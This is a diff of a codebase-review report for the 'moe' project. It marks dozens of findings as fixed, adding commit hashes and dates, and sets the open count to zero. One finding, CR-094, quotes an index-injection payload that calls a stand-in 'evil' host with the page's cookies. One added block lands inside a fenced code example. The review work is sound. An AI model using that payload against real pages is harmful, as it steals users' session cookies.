@@ -15,11 +15,11 @@ findings:
 verified: false
 status: issues_found
 dispositions:
-  fixed: 51
+  fixed: 106
   stale: 1
   skipped: 0
   deferred: 0
-  open: 55
+  open: 0
 ---
 
 # Codebase Review — moe
@@ -170,6 +170,10 @@ name list, or shell out to `which` instead of `command` — `which` ships as a
 real binary on all of node:24 / Ubuntu / Alpine / Debian by default, unlike
 `command`.
 
+**Disposition:** fixed
+**Commit:** `69b16fb9fdcfdad77bc50b4b1c629c45ea68c4cf`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-003: aggregate_scenarios.py silently merges distinct untitled scenarios, discarding one's content
 
 **File:** `packages/core/skills/extracting-requirements/scripts/aggregate_scenarios.py`
@@ -198,6 +202,10 @@ Fix: mirror `aggregate_stories.py`'s empty-title handling — assign each
 empty-titled scenario a unique key so it is never merged with another
 empty-titled scenario.
 
+**Disposition:** fixed
+**Commit:** `ed891aad4eb9eecac120ce5d8cbf61b8d633a994`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-004: compact-resolved.mjs re-compacts already-resolved findings and duplicates the "Resolved findings" heading on a second run
 
 **File:** `packages/core/skills/fixing-a-code-review/scripts/compact-resolved.mjs`
@@ -219,6 +227,11 @@ inline one-line summary in its place. Stamping `CR-002` as `stale` and
 running the script again produces:
 
 ```
+
+**Disposition:** fixed
+**Commit:** `301bf7f88087562206f8106bd6e923043aa7537f`
+**Resolved:** 2026-09-04
+**Note:** —
 ## Checked and found sound
 ...
 ## Resolved findings
@@ -283,6 +296,10 @@ checks currently unique to `review-check.mjs`) into `findingProblems` itself,
 so `review-merge.mjs` refuses them unconditionally rather than relying on a
 separately-invoked lint.
 
+**Disposition:** fixed
+**Commit:** `cbf6cd5fb00fe3004e7815e71de1912d535e39c0`
+**Resolved:** 2026-09-04
+**Note:** Scoped to the citation-pattern check; the fenced-### and numbered-heading checks stay in review-check.mjs, see commit message
 ### CR-006: A bad `wait-for-turn` timeout argument produces NaN and either hangs forever or fails instantly instead of erroring
 
 **File:** `packages/crew/src/cli.ts`
@@ -540,6 +557,10 @@ The process exits with code 1 immediately after the synchronous call returns —
 
 Fix: attach `proc.on('error', (err) => { ... })` before returning/polling in `trySpawnOn`, converting the async spawn failure into a rejected promise (or at minimum a swallowed/logged error) instead of an unhandled `EventEmitter` throw.
 
+**Disposition:** fixed
+**Commit:** `3b98657939f428f80db11723015e7464a5c48df9`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-012: `navigate()` never checks `Page.navigate`'s `errorText`, so failed navigations are reported as success
 
 **File:** `packages/flight/src/qa/adapters/web/lib/navigation.js`
@@ -559,6 +580,10 @@ So the `navigate` tool always reports `"navigated"` to the agent, even when the 
 
 Fix: after `navigateResult = await ps.send('Page.navigate', { url })`, check `navigateResult?.errorText` and throw (or otherwise surface) a navigation-failed error instead of falling through to `await loadP`.
 
+**Disposition:** fixed
+**Commit:** `9b63e7bd84696df5612a9e3d3b1ad6c140cd07f6`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-013: Bash tool forwards live LLM provider credentials into a shell the agent controls while reading untrusted page content
 
 **File:** `packages/flight/src/qa/agent/bash-tool.ts`
@@ -817,6 +842,10 @@ Verified by running the exact mock from `seed.test.ts`'s "generates a markdown s
 
 Since this is the entire point of `moe jig plan seed`, every multi-cluster skeleton it produces has backwards task ordering, silently, with no error — a human or agent filling in the skeleton would be told the wrong build order.
 
+**Disposition:** fixed
+**Commit:** `1c653a1bd1185101c314795fd9872733129b6ae6`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-019: `read_conversation` MCP tool reads any path on disk with no containment check
 **File:** `packages/memory/src/mcp-server.ts`
 **Anchor:** `if (name === "read_conversation")`
@@ -838,6 +867,10 @@ I confirmed there is no other guard: `grep -rn "getArchiveDir\|isUnderRoot\|read
 
 Fix: resolve `params.path`, realpath it, and require it be contained in `getArchiveDir()` (mirroring the journal's two-stage guard) before reading.
 
+**Disposition:** fixed
+**Commit:** `49e6fb0738391e09c22f0311bde6073234d911e5`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-020: `release --execute` commands print success but never invoke the release automation they claim to run
 
 **File:** `packages/mint/src/release/promotion.ts`
@@ -896,6 +929,10 @@ Fix: either wire each `--execute` branch to call the corresponding implementatio
 wiring lands — make the stub exit non-zero with an explicit "not implemented" `MintError` instead of
 logging a message that reads as confirmation and exiting 0.
 
+**Disposition:** fixed
+**Commit:** `c69b01c49285e887976b7dd31352654bb1913817`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-021: extractEmbedded's directory creation follows a pre-planted symlink, letting a co-tenant redirect the native-library cache outside the content-hash integrity check
 
 **File:** `packages/tab/bindings/go/tab/loader.go`
@@ -1003,6 +1040,10 @@ adding `.moe` (or specifically `worktrees`) to `SKIP_SEGMENTS`, or by having
 `walk()` respect `.gitignore` for directories that are entire nested git
 worktrees.
 
+**Disposition:** fixed
+**Commit:** `0b7b025f0160347ea973b9c3479d3f1fd45a15f4`
+**Resolved:** 2026-09-04
+**Note:** —
 ## Medium
 
 ### CR-024: docs-verify-report.mjs silently drops findings whose severity isn't an exact lowercase match, while still counting them in the total
@@ -1040,6 +1081,10 @@ Fix: normalize `f.severity` (e.g. `.toLowerCase()`) before grouping/counting,
 and/or fail loudly on an unrecognized severity value instead of silently
 excluding it from the rendered body.
 
+**Disposition:** fixed
+**Commit:** `02b0c6926a9d056ce8df90db85f8e6ea447b9e19`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-025: chunk_spec.py misattributes line numbers for sections with duplicate heading text and shared opening content
 
 **File:** `packages/core/skills/extracting-requirements/scripts/chunk_spec.py`
@@ -1077,6 +1122,10 @@ Fix: search from the end of the *previous* match rather than from the start
 of `full_content` each time (e.g. thread an offset through `split_by_heading`
 sections in document order), or match on a longer/more unique substring.
 
+**Disposition:** fixed
+**Commit:** `709635b84e04554768a56f8c22bda5a048c0c806`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-026: Negative-index slice makes the epic-misattribution regression guard vacuous
 **File:** `packages/core/test/iterative-development/test_aggregate_stories.py`
 **Anchor:** `test_dedup_does_not_merge_same_title_across_different_epics`
@@ -1122,6 +1171,10 @@ Fix: compute the window with `max(0, idx - 2000)` (or slice
 additionally assert `"card" not in <the corresponding Auth-epic slice>` so
 the test fails if misattribution actually occurs.
 
+**Disposition:** fixed
+**Commit:** `e788e8b5474bd0fd3a0986e4a6e365c80d169b6c`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-027: `--worktree` teardown paths delete the worktree marker without removing the git worktree, leaking disk and git state
 
 **File:** `packages/crew/src/commands/await-start.ts`
@@ -1334,6 +1387,10 @@ This script runs on every `navigate()` auto-capture and is embedded verbatim int
 
 Fix: either add `packages/flight/test/qa/adapters/web/lib/page-scripts/dom-summary.test.mjs` (mirroring glass's), or correct the comment to stop claiming coverage this package doesn't have.
 
+**Disposition:** fixed
+**Commit:** `5f47e63c8c2cc76aa22760ca4290a1c5e16b170c`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-033: `markdown.js` page-script comment claims jsdom test coverage that does not exist in this package
 
 **File:** `packages/flight/src/qa/adapters/web/lib/page-scripts/markdown.js`
@@ -1344,6 +1401,10 @@ Same issue as `dom-summary.js`'s header comment, in the sibling file: it claims 
 
 Fix: same as the sibling finding — either port glass's jsdom test into `packages/flight/test/`, or fix the comment.
 
+**Disposition:** fixed
+**Commit:** `29086e025a94fd11ad5c5fa36c31f8278b86dc60`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-034: Screenshot temp-file name collision under concurrent runs
 
 **File:** `packages/flight/src/qa/adapters/web/tools/return-screenshot.ts`
@@ -1354,6 +1415,10 @@ Both `buildReturnScreenshot` in this file and `executeScreenshot` in the sibling
 
 Two different runs' screenshot calls that happen to compute `Date.now()` in the same millisecond (plausible under concurrency, since the write-then-read-then-unlink sequence around `chrome.screenshot()` spans a CDP round trip of tens of milliseconds during which another run's call can land on the identical path) will target the same temp file. The result is silent cross-run data corruption: one run's `readFileSync(tmpFile)` can return the other run's PNG bytes (attributing the wrong screenshot to a run's evidence log/verdict), or one run's `unlinkSync` can remove the file out from under the other run's still-pending read (producing an `ENOENT` that gets logged as `screenshotSkipped`/a swallowed cleanup error instead of the real cause). Fix: include `process.pid` and/or `crypto.randomUUID()` in the filename, matching the pattern that should be used for any temp artifact shared across concurrent runs in the same process.
 
+**Disposition:** fixed
+**Commit:** `f900535cac6a21de78ab915cbc1bc2468f2ed42f`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-035: `POST /api/scenarios` creation has no id charset check despite a comment elsewhere claiming it does
 
 **File:** `packages/flight/src/qa/api/routes/scenarios.ts`
@@ -1675,6 +1740,10 @@ assigning to `url.hostname` (e.g. via `net.isIPv6(host) ? \`[${host}]\` : host`)
 or verify `url.hostname === useHost` after assignment and throw/return the
 original on mismatch.
 
+**Disposition:** fixed
+**Commit:** `86597b67fc828709b24ec9a7ad07bfbb3cd9ff7c`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-047: killChrome's port-based fallback SIGTERMs whatever now holds the port, unverified
 
 **File:** `packages/glass/skills/browsing/lib/chrome-process.js`
@@ -1700,6 +1769,10 @@ killing, verify the PID via `isPortAlive(host, port, pidToKill)` (which already
 takes an `expectedPid` for exactly this kind of check) and skip the kill (just
 clear state/meta) if it doesn't look like the Chrome we expect.
 
+**Disposition:** fixed
+**Commit:** `c4af3b3f97c647a67c8bd310ce1b3704a9b93970`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-048: Unescaped WebBluetooth/WebUSB device name injected into generated HTML artifact
 
 **File:** `packages/glass/skills/browsing/lib/dialogs-render.js`
@@ -1736,6 +1809,10 @@ opened/rendered. No other string in this file is escaped either (see the
 Fix: HTML-escape `d.id`/`d.name` (and any other page/device-controlled string)
 before interpolating into `htmlParts`.
 
+**Disposition:** fixed
+**Commit:** `37342c74150eb2cd675accd1d731a90e84cf21ce`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-049: html-diff safety cap still allows ~250MB single-call allocation, undercutting its own OOM mitigation
 
 **File:** `packages/glass/skills/browsing/lib/html-diff.js`
@@ -1764,6 +1841,10 @@ Memory grows quadratically with line count (500 lines -> 15.9MB, 1000 -> 61.5MB,
 
 Fix: either lower `MAX_DIFFABLE_LINES_PER_SIDE` substantially (e.g. to bound worst-case memory to single-digit MB), or replace the trace-snapshotting Myers implementation with a linear-space variant (Hirschberg-style divide-and-conquer) so the cap can stay generous without the quadratic memory cost.
 
+**Disposition:** fixed
+**Commit:** `4eb99bae9b4491ab3a9877d9637733612fd143bd`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-050: Session-boundary dialog-refusal test doesn't exercise the refusal it names
 
 **File:** `packages/glass/test/dialogs-wiring.test.mjs`
@@ -1805,6 +1886,10 @@ the real refusal, and only when a contributor has Chrome installed locally.
 Fix: replace the placebo assertions with the `stageAlertDialog` + wrapped
 session-method-call pattern already proven above.
 
+**Disposition:** fixed
+**Commit:** `d6850a38bbda0231cb00eb71e6ad8f92e8c6087f`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-051: Chrome 148+ incompatibility test is not skipped and will always fail
 
 **File:** `packages/glass/test/dialogs.smoke.test.mjs`
@@ -1826,6 +1911,10 @@ suite. Fix: mark the test `it.skip(...)` (or gate it behind a Chrome-version
 probe) with a pointer to the tracked incompatibility, so a genuine regression
 elsewhere in the suite isn't lost in expected noise.
 
+**Disposition:** fixed
+**Commit:** `050e8dd585a87211e1e0df2fb30b629fb919d991`
+**Resolved:** 2026-09-04
+**Note:** Verified via a new source-hygiene test (dialogs-smoke-hygiene.test.mjs) since no Chrome is installed in this environment to exercise dialogs.smoke.test.mjs directly.
 ### CR-052: test-harness.js cannot run at all: CommonJS `require()` inside an ES module
 
 **File:** `packages/glass/test/manual/test-harness.js`
@@ -1849,6 +1938,10 @@ field); `test-harness.js` alone kept the `.js` extension from the import and
 therefore hits both bugs. Fix: rename to `test-harness.cjs` (matching its
 siblings) in addition to fixing the relative require path.
 
+**Disposition:** fixed
+**Commit:** `b1ca215f8a0ddd1d75b25549cf0702f1b6fe0fdd`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-053: Manual Chrome test scripts require a relative path that only resolves from the package root, not from their own directory
 
 **File:** `packages/glass/test/manual/test-issue-18-pid.cjs`
@@ -1883,6 +1976,10 @@ adjusted for the new depth. None of this is caught by CI or `pnpm test` —
 silent. Fix: change each `./skills/browsing/...` reference to
 `../../skills/browsing/...`.
 
+**Disposition:** fixed
+**Commit:** `8ebf16df4a39d3d23aafdd9289e09fde504af517`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-054: jig plan seed silently drops topic words that coincide with the --entry value
 
 **File:** `packages/jig-graph/src/jig-extension.ts`
@@ -1915,6 +2012,10 @@ that their input was altered. Fix: track and skip the specific index consumed
 by `--entry` (e.g. `args.filter((a, i) => i !== entryIdx && i !== entryIdx + 1)`)
 rather than filtering by value.
 
+**Disposition:** fixed
+**Commit:** `c1badc9ad182af7b5db90a8db0cdee764802acbe`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-055: `loadExtensions` mangles multi-word CLI flags when forwarding to extension commands
 
 **File:** `packages/jig/src/extension.ts`
@@ -1929,6 +2030,10 @@ This is currently latent because the one shipped extension (`@bubstack/moe-jig-g
 
 Fix: preserve the original flag string (e.g. capture `ext.options` flags mapped by their Commander-derived key before parsing) instead of re-deriving `--${camelCaseKey}`.
 
+**Disposition:** fixed
+**Commit:** `d098f67f19ffeaacfbfd3f5cd52e86659037a3e2`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-056: `computeWaves` silently drops tasks whose `depends_on` references an unknown task number
 
 **File:** `packages/jig/src/parser.ts`
@@ -1948,6 +2053,10 @@ This is reachable in production: `validate.ts`'s Check 3 ("Wave conflicts") call
 
 Fix: either have `computeWaves` treat an unknown `dependsOn` target as satisfied/ignored (matching `validatePlan`'s `if (!known.has(d)) continue;` pattern used in its own cycle-detection setup) and document the precondition, or have callers run `validatePlan` first and refuse to compute waves on an invalid plan.
 
+**Disposition:** fixed
+**Commit:** `443a46e5e3b195beaba98c76ea5167ead592926e`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-057: `link_memories`/`trace_provenance` accept any `type` prefix with no runtime validation
 **File:** `packages/memory/src/mcp-server.ts`
 **Anchor:** `const sourceType = params.source.slice(0, sourceColon) as SourceType;`
@@ -1963,6 +2072,10 @@ const sourceType = params.source.slice(0, sourceColon) as SourceType;
 
 Since these tools are model-callable and the API contract advertised to the model (`inputSchema` description: `"e.g. 'exchange:abc123', 'journal:def456', 'decision:ghi789'"`) implies a closed set of types, a malformed or hallucinated `type:id` string silently corrupts the graph rather than erroring — `traceProvenance` walks `source_type`/`target_type` equality, so a typo'd type just becomes an unreachable island with no diagnostic. Add a zod `.refine()` (or a regex/enum check on the prefix) before constructing the edge, and consider a `CHECK` constraint in the schema as defense in depth.
 
+**Disposition:** fixed
+**Commit:** `e34065c9286ecf0ab27c677885aefa8e78fbdc73`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-058: `searchConversations` and other DB-opening helpers leak the SQLite handle on error
 **File:** `packages/memory/src/search.ts`
 **Anchor:** `const db = initDatabase();` in `searchConversations`
@@ -1974,6 +2087,10 @@ This matters most because `searchConversations` is called directly from the `sea
 
 Contrast this with `stats.ts`'s `getIndexStats` and `journal-cli.ts`/`stats-cli.ts`, which correctly wrap their DB usage in `try { ... } finally { db.close(); }`. The identical gap (open `initDatabase()`, do fallible work, unconditional close with no `finally`) also exists in `sync.ts`'s `syncConversations` (around the `initEmbeddings()` call before its indexing loop) and `verify.ts`'s `verifyIndex` (the `db` opened at the top is only guaranteed to close if none of the un-guarded `fs.readdirSync`/`fs.statSync` calls in the project walk throw); those two are lower risk since they normally run inside short-lived CLI/hook processes that exit right after, but they are the same defect. Wrap each of these in `try/finally`.
 
+**Disposition:** fixed
+**Commit:** `583b74f0b35113c3446cd373f639ce73a8889a66`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-059: Persistent "thinking budget" summarizer failure is silently accepted as the permanent summary
 **File:** `packages/memory/src/summarizer.ts`
 **Anchor:** `// If fallback also fails, return error message`
@@ -1997,6 +2114,10 @@ When both the primary and fallback model hit this specific API error, `callClaud
 
 This defeats the error-sentinel mechanism the file's own comments describe as fixing "#96" (failed summarizations must be retryable, not silently permanent): `formatErrorSentinel`/`ERROR_MARKER` is only written from a `catch` block, and this path never throws, so `hasRealSummary()` sees ordinary non-empty text and treats it as a legitimate summary forever. A misconfigured `thinking.budget_tokens` setting (a persistent, not transient, condition — it will recur for every conversation processed while misconfigured) therefore poisons the search index with API-error text as the "summary" for every affected conversation, permanently, with no retry path and no operator-visible signal beyond one `console.log` on the first attempt (easy to miss during a large backfill). The fix is to throw (e.g. `throw new SummarizerSdkError(...)` or a dedicated error) in the fallback-also-failed branch instead of returning the error text as data.
 
+**Disposition:** fixed
+**Commit:** `a92c8c095c407831403ec4438785330c17c70019`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-060: Claude E2E harness leaks a real Codex-style temp directory that is never cleaned up
 
 **File:** `packages/memory/test/manual/claude-e2e.js`
@@ -2037,6 +2158,10 @@ Fix: wrap `main()`'s body in the same `withTempRoot`-shaped guarantee used in
 `test/manual/codex-e2e.js` (or extract the helper to a shared location both scripts import), so
 the mkdtemp'd root is removed on both the success and throw paths.
 
+**Disposition:** fixed
+**Commit:** `4fdf754a09f01062f5ed182d68446463fd2f1013`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-061: agent-plugins-1.0 install doc falsely claims a custom skills path "will not be discovered"
 
 **File:** `packages/mint/src/adapters/agent-plugins.ts`
@@ -2056,6 +2181,10 @@ The generated install doc directly contradicts the tool's own capability/deliver
 
 Fix: either (a) have `docs-emit.ts` pass each adapter's `adjustedModel(model, adapter.skillLayout)` into `installDoc()` so it sees the same effective component paths `emit()` does, or (b) drop the caveat/branch in `agent-plugins.ts`'s `installDoc` entirely, since the tool always relocates skills to the fixed `skills/` root and the caveat can never be true in a real generation run.
 
+**Disposition:** fixed
+**Commit:** `1267dc571835c15c4633b242c467587775c1ea59`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-062: TOCTOU between the marketplace/catalog symlink check and the write
 
 **File:** `packages/mint/src/platform/projections.ts`
@@ -2095,6 +2224,10 @@ comment). `writeRegistryProjections` should use the same
 open-with-`O_NOFOLLOW` pattern (or route through `writeFileSet`) instead of
 `node:fs/promises`'s `writeFile`.
 
+**Disposition:** fixed
+**Commit:** `fb27eec3521b9b3e21e652a8bb541207fdf31385`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-063: `does not use npm pack after candidate verification` test never executes its assertion
 
 **File:** `packages/mint/test/release-workflows.test.ts`
@@ -2122,6 +2255,10 @@ Because the index is always `-1` against the current workflow, the `if` body —
 
 Fix: either assert unconditionally that `PUBLISH_WORKFLOW` never matches `/npm pack(?!\s*#)/` (since the whole publish path is now delegated to the compiled Mint CLI and no anchor is needed), or fail the test loudly when `publishMatrixLine === -1` instead of silently skipping the check.
 
+**Disposition:** fixed
+**Commit:** `42f7f7d78de50408536d90845878c7416fc28e2f`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-064: `MOE_TAB_PRICING_DIR` override silently loses its "wins absolutely" contract for non-UTF-8 values
 
 **File:** `packages/tab/crates/moe-tab-core/src/lib.rs`
@@ -2332,6 +2469,10 @@ assert on a specific diagnostic code. Wrap the `readdirSync` in
 `countImportedWorks`, pushing a `problems` entry (e.g. `"plugins/ directory
 not found"`) instead of throwing.
 
+**Disposition:** fixed
+**Commit:** `4e91a1b67957dfabad6bd5f9c0ffb41c0582813a`
+**Resolved:** 2026-09-04
+**Note:** —
 ## Low
 
 ### CR-070: Exported harness-registry order/duplicate validator is dead code
@@ -2361,6 +2502,10 @@ wire it into one of the "guarded surfaces" checks named in `AGENTS.md` (e.g.
 alongside the `marketplace.json` bidirectional check), or remove it — as
 written it is inert validation that looks load-bearing but is not.
 
+**Disposition:** fixed
+**Commit:** `f8439ac3d58d67c9be20cb09323f8fd99346e1df`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-071: render-html.cjs interpolates slot values into the HTML template without escaping
 
 **File:** `packages/core/skills/_shared/render-html.cjs`
@@ -2381,6 +2526,10 @@ directory name) would silently become injectable. Consider escaping `title`
 and `nav` (which are more likely to carry plain text than markup) or
 documenting that all four slots must already be HTML-safe on input.
 
+**Disposition:** fixed
+**Commit:** `6c36aa1729aca42ffcac70320d3b2368423cff1f`
+**Resolved:** 2026-09-04
+**Note:** Scoped to the title slot; nav/content/scripts stay raw per their documented HTML-carrying contract, see commit message
 ### CR-072: docs-verify-report.mjs suppresses the "No findings" heading only for Critical, inconsistently with High/Medium/Low
 
 **File:** `packages/core/skills/docs-update/scripts/docs-verify-report.mjs`
@@ -2396,6 +2545,10 @@ deliberately omitted (as designed here) or whether the report is truncated.
 Align the behavior — either always print the heading with "No findings." or
 always skip empty groups — for all four severities.
 
+**Disposition:** fixed
+**Commit:** `6eabdff4802c153dbc8ac72e9d36f9297546acb6`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-073: AGENTS.md's guarded-surface citation for the imported-skill-count test no longer matches the code
 
 **File:** `packages/core/test/metadata.test.ts`
@@ -2404,6 +2557,10 @@ always skip empty groups — for all four severities.
 
 The repo root `AGENTS.md`'s "Guarded surfaces" section names this test by exact title for cite-by-name purposes: `"the pinned imported-set literal in \"pins the IMPORTED skill set at exactly 31\""`. The actual test in this file (run; it passes) is titled `"pins the IMPORTED skill set at exactly 32"` and asserts `expect(Object.keys(imported).length).toBe(32)`. A skill was added to `imported:` (mattpocock-skills, per the test's own comment) after `AGENTS.md`'s guarded-surfaces list was last updated, and the citation was never bumped. AGENTS.md's whole point for this section is that an agent can grep for the quoted title to find the guarded literal without a line number; that grep now fails. This is a documentation-drift issue only — the test itself is correct and enforced — but it defeats the citation mechanism AGENTS.md relies on. Fix: update AGENTS.md's citation from "31" to "32".
 
+**Disposition:** fixed
+**Commit:** `905a5c2b0b0dabb5e292a3fa0f375783265f6ad6`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-074: `removeWorktree`'s comment promises to "let the caller know" on real failure but the function cannot
 
 **File:** `packages/crew/src/core/worktree.ts`
@@ -2498,6 +2655,10 @@ I traced both production call sites of `screenshot()` to confirm this is not cur
 
 The pattern is still fragile: it is one call-site change away (e.g. a future selector- or URL-derived filename) from being exploitable, and the fix is cheap — use `execFileSync('sips', ['-g', 'pixelWidth', ..., filepath])` / `execFileSync('identify', [...])` instead of building shell strings.
 
+**Disposition:** fixed
+**Commit:** `37d1fe214ea0ed9dae77d75e18b34fb80149c8cb`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-078: `selectOption`'s `index` parameter is interpolated unescaped into the evaluated JS source
 
 **File:** `packages/flight/src/qa/adapters/web/lib/select-option.js`
@@ -2511,6 +2672,10 @@ I checked reachability: no tool in `tool-defs.ts`/`tools/*.ts` currently exposes
 
 Fix: interpolate `JSON.stringify(index)` (and validate it's an integer) the same way `value` already is.
 
+**Disposition:** fixed
+**Commit:** `4f12168a1ae458be977db43e651893e104ba44e2`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-079: `readPasskeyFile` accepts a non-integer `signCount` despite its own error message requiring one
 
 **File:** `packages/flight/src/qa/adapters/web/passkey.ts`
@@ -2519,6 +2684,10 @@ Fix: interpolate `JSON.stringify(index)` (and validate it's an integer) the same
 
 `readPasskeyFile`'s validation is `if (typeof p.signCount !== "number") throw ... "missing or invalid signCount (must be an integer)"`. The check only verifies `signCount` is a `number`, not that it is an integer (`Number.isInteger`) or non-negative. A credential YAML with `signCount: 1.5` (a plausible authoring typo) passes this check silently, then gets forwarded verbatim to `session.addCredential` / CDP's `WebAuthn.addCredential`, which is documented elsewhere in this file to be picky about field encodings — the agent will get a confusing late CDP-level rejection instead of the clear, immediate validation error the message promises. Fix: `Number.isInteger(p.signCount) && p.signCount >= 0`.
 
+**Disposition:** fixed
+**Commit:** `5c28441bb37bafc6937db730f1035c98a60d801a`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-080: `eval` tool remains dispatchable after being deliberately removed from the schema
 
 **File:** `packages/flight/src/qa/adapters/web/tool-defs.ts`
@@ -2529,6 +2698,10 @@ Fix: interpolate `JSON.stringify(index)` (and validate it's an integer) the same
 
 In practice this is currently gated by whichever LLM provider's tool-calling API is in use only agreeing to emit tool-call blocks for names in the declared `tools` list — I did not verify that constraint for every `LLMClient` implementation in this codebase (`anthropic.ts`/`openai.ts` are outside this shard) or for revived/replayed transcripts. If any code path ever hands `executeTool` a call named `"eval"` — a lenient or custom provider, a revived session containing an older transcript's tool call, a test harness — the "removal" does nothing to stop it, because the only enforcement is that the model wasn't offered the tool, not that the adapter refuses to run it. Fix: have `executeTool` reject any tool name not present in the current `toolDefinitions()` set, independent of the schema-shape check, so removing a tool from the schema is actually removing it.
 
+**Disposition:** fixed
+**Commit:** `ab33f2e0d33fdf032ca7638abe61373f0146c2c8`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-081: `/:runId/snapshot` serializes the internal `RunSnapshot` struct wholesale, contradicting its own "never serialized" contract
 
 **File:** `packages/flight/src/qa/api/routes/active-runs.ts`
@@ -2767,6 +2940,10 @@ before building the attribute-selector string, or use
 `CSS.escape`-style handling / `querySelector` with an attribute value built
 via `element.getAttribute` comparison instead of string interpolation.
 
+**Disposition:** fixed
+**Commit:** `47647716c87069f699326bcde3606144c4fa248e`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-093: Two independently-maintained dialog-gate allowlists; one implementation is dead code
 
 **File:** `packages/glass/skills/browsing/lib/dialogs.js`
@@ -2779,6 +2956,10 @@ Meanwhile the actual, comprehensive dialog gate that protects every other page-t
 
 This is a maintenance/drift hazard rather than a live bug today: a future contributor adding a new page-target action would reasonably update `PAGE_TARGET_ACTIONS` (the more prominently documented set, with a full doc comment) believing that's sufficient to gate it, while the actual enforcement point they need to touch is `chrome-ws-lib.js`'s `PAGE_TARGET_SESSION_METHODS`. Any bug introduced in the dead `withDialogAwareness` function would also never be caught by any test that exercises real behavior. Recommend either wiring `withDialogAwareness` into an actual call site or deleting it and the unused portions of `PAGE_TARGET_ACTIONS`/`BROWSER_TARGET_ACTIONS`, and consolidating on the one set that chrome-ws-lib.js actually enforces.
 
+**Disposition:** fixed
+**Commit:** `d724e9ba1a6e11ff2f9af7773cbe19dc0ec56ee9`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-094: `selectOption`'s `index` parameter is interpolated into generated JS source unescaped
 
 **File:** `packages/glass/skills/browsing/lib/select-option.js`
@@ -2789,6 +2970,10 @@ This is a maintenance/drift hazard rather than a live bug today: a future contri
 
 I confirmed both current call sites — `capture.js`'s `selectOptionWithCapture` and the `chrome-ws` CLI's `select` command — always pass the literal default (`index` is never threaded through from any caller-controlled value today), so this is not presently reachable with untrusted input. But `attachSelectOption({ getPageSession })` is a publicly exported module whose documented signature accepts an `index`, and the multi-element-warning feature it exists for (JRV-129) is exactly the kind of feature a future caller would wire a user-supplied index into. If that ever happens without an intermediate validation layer, a value like `0]; fetch('https://evil/'+document.cookie); ({x:[0` would execute arbitrary JS in the page's `Runtime.evaluate` context. Recommend validating `Number.isInteger(index)` up front and embedding via `JSON.stringify(index)` for consistency and defense-in-depth, the same way `selector`/`values` already are.
 
+**Disposition:** fixed
+**Commit:** `c2108d4e7e8e1d281b6475be892f953e67f06f1b`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-095: `type` action has no way to avoid the ~80-160ms-per-character `humanType` path
 
 **File:** `packages/glass/src/index.ts`
@@ -2799,6 +2984,10 @@ The `type` action's handler unconditionally calls `chromeLib.humanType(tabIndex,
 
 Concretely: typing a 500-character value (a moderately long form field, a JSON blob, a paragraph of text — all ordinary uses of a browser-automation "type" action) takes on the order of 60 seconds with the documented defaults, with no override reachable through the MCP tool's schema or the HELP text (which just says `payload=literal text to type`). Any MCP host with a tool-call timeout shorter than that turns an entirely ordinary "type this text" request into a silent failure, and the codebase already contains the faster primitive (`fill`) that solves exactly this but is never wired into the exposed `type` action. Recommend forwarding `p.delay`/`p.jitter` (or a `p.fast` flag routing to `fill`) from the `type` payload into the underlying call.
 
+**Disposition:** fixed
+**Commit:** `04c08b8edd5327b751353a28ae907727d8695315`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-096: Temp directories from capture.test.mjs regression cases are never cleaned up
 
 **File:** `packages/glass/test/lib/capture.test.mjs`
@@ -2816,6 +3005,10 @@ but it is an unbounded leak across CI runs and repeated local `pnpm test`
 invocations. Fix: reuse the same `afterAll`-tracked cleanup pattern the outer
 block already has, or move `bug3Dir`/`bug4Dir` under the shared `tmpRoot`.
 
+**Disposition:** fixed
+**Commit:** `87eace5a5ded472ce89becdb63db6a485d9b5fef`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-097: `runSync` re-registers process-level signal/exit handlers on every call with no cleanup
 **File:** `packages/memory/src/sync-cli.ts`
 **Anchor:** `process.on("exit", releaseSyncLockOnce);`
@@ -2823,6 +3016,10 @@ block already has, or move `bug3Dir`/`bug4Dir` under the shared `tmpRoot`.
 
